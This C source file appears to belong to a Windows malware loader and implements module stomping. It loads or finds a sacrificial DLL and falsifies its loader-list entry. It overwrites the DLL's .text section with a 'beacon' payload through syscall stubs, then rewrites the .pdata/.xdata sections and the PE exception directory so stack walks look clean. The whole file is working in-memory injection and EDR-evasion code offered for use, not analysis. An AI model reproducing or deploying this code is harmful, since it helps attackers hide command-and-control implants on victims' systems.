#include "Common.h"
#include "Constexpr.h"
#include "Loader.h"

#define LDRP_IMAGE_DLL               0x00000004
#define LDRP_LOAD_NOTIFICATIONS_SENT   0x00000008
#define LDRP_PROCESS_STATIC_IMPORT   0x00000020
#define LDRP_ENTRY_PROCESSED         0x00004000

//
// Find an already-loaded module by wide name (case-insensitive).
//
FUNC PVOID NaxFindLoadedModule(
    _In_ PWCHAR DllName ) {

    PPEB_LDR_DATA Ldr = NtCurrentPeb()->Ldr;
    PLIST_ENTRY   Head = &Ldr->InLoadOrderModuleList;
    PLIST_ENTRY   Cur  = Head->Flink;

    while ( Cur != Head ) {
        PLDR_DATA_TABLE_ENTRY Entry = (PLDR_DATA_TABLE_ENTRY)Cur;
        PWSTR buf = Entry->BaseDllName.Buffer;
        if ( buf ) {
            BOOL match = TRUE;
            for ( UINT32 i = 0; i < NAX_HDR_DLL_MAX; i++ ) {
                WCHAR a = DllName[i];
                WCHAR b = buf[i];
                if ( a == L'\0' ) {
                    match = (b == L'\0');
                    break;
                }
                if ( a >= L'a' && a <= L'z' ) a -= 0x20;
                if ( b >= L'a' && b <= L'z' ) b -= 0x20;
                if ( a != b ) { match = FALSE; break; }
            }
            if ( match ) return Entry->DllBase;
        }
        Cur = Cur->Flink;
    }

    return NULL;
}

FUNC VOID NaxPatchLdr(
    _In_ PVOID DllBase ) {

    PPEB_LDR_DATA Ldr = NtCurrentPeb()->Ldr;
    PLIST_ENTRY   Head = &Ldr->InLoadOrderModuleList;
    PLIST_ENTRY   Cur  = Head->Flink;

    PIMAGE_NT_HEADERS Nt = NaxPeHeaders( DllBase );
    if ( !Nt ) return;

    while ( Cur != Head ) {
        PLDR_DATA_TABLE_ENTRY Entry = (PLDR_DATA_TABLE_ENTRY)Cur;
        if ( Entry->DllBase == DllBase ) {
            Entry->EntryPoint = C_PTR( U_PTR(DllBase) + Nt->OptionalHeader.AddressOfEntryPoint );
            Entry->Flags |= LDRP_IMAGE_DLL | LDRP_LOAD_NOTIFICATIONS_SENT |
                             LDRP_PROCESS_STATIC_IMPORT | LDRP_ENTRY_PROCESSED;
            return;
        }
        Cur = Cur->Flink;
    }
}

#if NAX_STOMP_MODE == NAX_STOMP_MODULE || NAX_STOMP_MODE == NAX_STOMP_ALREADYLOADED

FUNC PVOID NaxModuleStomp(
    _In_ PVOID   HdrPtr,
    _In_ PVOID   BeaconSrc,
    _In_ ULONG   BeaconSize,
    _In_ PVOID   PdataSrc,
    _In_ ULONG   PdataSize,
    _In_ PVOID   XdataSrc,
    _In_ ULONG   XdataSize,
    _In_ ULONG   OrigTextRva,
    _In_ PWCHAR  DllName ) {

    STARDUST_INSTANCE

    PVOID  DllBase  = NULL;
    SIZE_T ProtSize = 0;
    ULONG  OldProt  = 0;

    //
    // 1) Acquire the sacrificial DLL.
    //
#if NAX_STOMP_MODE == NAX_STOMP_ALREADYLOADED
    DllBase = NaxFindLoadedModule( DllName );
#endif
    if ( !DllBase ) {
        UNICODE_STRING usName = { 0 };
        // Compute length of DllName safely.
        USHORT len = 0;
        for ( ; len < NAX_HDR_DLL_MAX && DllName[len] != L'\0'; len++ )
            ;
        usName.Buffer = DllName;
        usName.Length = len * sizeof(WCHAR);
        usName.MaximumLength = usName.Length + sizeof(WCHAR);

        HANDLE hModule = NULL;
        NTSTATUS st = API(LdrLoadDll)( NULL, NULL, &usName, &hModule );
        if ( NT_SUCCESS(st) && hModule )
            DllBase = hModule;
    }

    if ( !DllBase )
        return NULL;

    NaxPatchLdr( DllBase );
    Instance()->StompDllBase = DllBase;

    PIMAGE_NT_HEADERS Nt = NaxPeHeaders( DllBase );
    if ( !Nt )
        return NULL;

    //
    // 2) Locate .text section.
    //
    PIMAGE_SECTION_HEADER TextSec = NaxFindSection( Nt, IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE );
    if ( !TextSec || TextSec->SizeOfRawData < BeaconSize )
        return NULL;

    PVOID TextBase = C_PTR( U_PTR(DllBase) + TextSec->VirtualAddress );
    ULONG DllTextRva = TextSec->VirtualAddress;

    //
    // 3) Save clean .text backup so the beacon can restore if it wants.
    //
    PVOID CleanTextBuf = Instance()->Win32.RtlAllocateHeap(
        NtCurrentPeb()->ProcessHeap, 0, TextSec->SizeOfRawData );

    //
    // 4) Flip .text to RW, copy beacon, restore RX.
    //
    ProtSize = TextSec->SizeOfRawData;

    NTSTATUS st = ( (pNtProtectVirtualMemory)SCAPI(NtProtectVirtualMemory).Stub )(
        NtCurrentProcess(), &TextBase, &ProtSize, PAGE_READWRITE, &OldProt );
    if ( !NT_SUCCESS(st) )
        return NULL;

    if ( CleanTextBuf )
        MmCopy( CleanTextBuf, TextBase, TextSec->SizeOfRawData );

    MmCopy( TextBase, BeaconSrc, BeaconSize );

    // Write stomp context tag after beacon code.
    if ( CleanTextBuf && TextSec->SizeOfRawData >= BeaconSize + 4 + sizeof(PVOID) + sizeof(ULONG) ) {
        PBYTE pTag = (PBYTE)TextBase + BeaconSize;
        ULONG magic = NAX_STOMP_CTX_MAGIC;
        ULONG cleanSize = TextSec->SizeOfRawData;
        MmCopy( pTag, &magic, sizeof(ULONG) );
        MmCopy( pTag + sizeof(ULONG), &CleanTextBuf, sizeof(PVOID) );
        MmCopy( pTag + sizeof(ULONG) + sizeof(PVOID), &cleanSize, sizeof(ULONG) );
    }

    ProtSize = TextSec->SizeOfRawData;
    st = ( (pNtProtectVirtualMemory)SCAPI(NtProtectVirtualMemory).Stub )(
        NtCurrentProcess(), &TextBase, &ProtSize, PAGE_EXECUTE_READ, &OldProt );
    if ( !NT_SUCCESS(st) )
        return NULL;

    //
    // 5) Stomp .pdata / .xdata for clean stack walks.
    //
    if ( PdataSize > 0 && XdataSize > 0 ) {
        PIMAGE_SECTION_HEADER PdataSec = NaxFindSectionByDir( Nt, IMAGE_DIRECTORY_ENTRY_EXCEPTION );
        if ( PdataSec && PdataSec->SizeOfRawData >= (PdataSize + XdataSize) ) {

            PVOID PdataBase = C_PTR( U_PTR(DllBase) + PdataSec->VirtualAddress );
            ULONG PdataRva  = PdataSec->VirtualAddress;

            ProtSize = PdataSec->SizeOfRawData;
            st = ( (pNtProtectVirtualMemory)SCAPI(NtProtectVirtualMemory).Stub )(
                NtCurrentProcess(), &PdataBase, &ProtSize, PAGE_READWRITE, &OldProt );
            if ( NT_SUCCESS(st) ) {

                MmCopy( PdataBase, PdataSrc, PdataSize );
                MmCopy( C_PTR(U_PTR(PdataBase) + PdataSize), XdataSrc, XdataSize );

                ULONG XdataRva   = PdataRva + PdataSize;
                ULONG EntryCount = PdataSize / sizeof(RUNTIME_FUNCTION);
                PRUNTIME_FUNCTION Entries = (PRUNTIME_FUNCTION)PdataBase;

                for ( ULONG i = 0; i < EntryCount; i++ ) {
                    Entries[i].BeginAddress += DllTextRva;
                    Entries[i].EndAddress   += DllTextRva;
                    Entries[i].UnwindData   += XdataRva;
                }

                // Patch PE header data directory.
                PVOID  HdrBase = DllBase;
                SIZE_T HdrSize = LDR_PAGE_SIZE;
                ULONG  HdrOld = 0;
                st = ( (pNtProtectVirtualMemory)SCAPI(NtProtectVirtualMemory).Stub )(
                    NtCurrentProcess(), &HdrBase, &HdrSize, PAGE_READWRITE, &HdrOld );
                if ( NT_SUCCESS(st) ) {
                    Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress = PdataRva;
                    Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size = PdataSize;
                    ( (pNtProtectVirtualMemory)SCAPI(NtProtectVirtualMemory).Stub )(
                        NtCurrentProcess(), &HdrBase, &HdrSize, HdrOld, &HdrOld );
                }

                ProtSize = PdataSec->SizeOfRawData;
                ( (pNtProtectVirtualMemory)SCAPI(NtProtectVirtualMemory).Stub )(
                    NtCurrentProcess(), &PdataBase, &ProtSize, OldProt, &OldProt );
            }
        }
    }

    return TextBase;
}

#endif
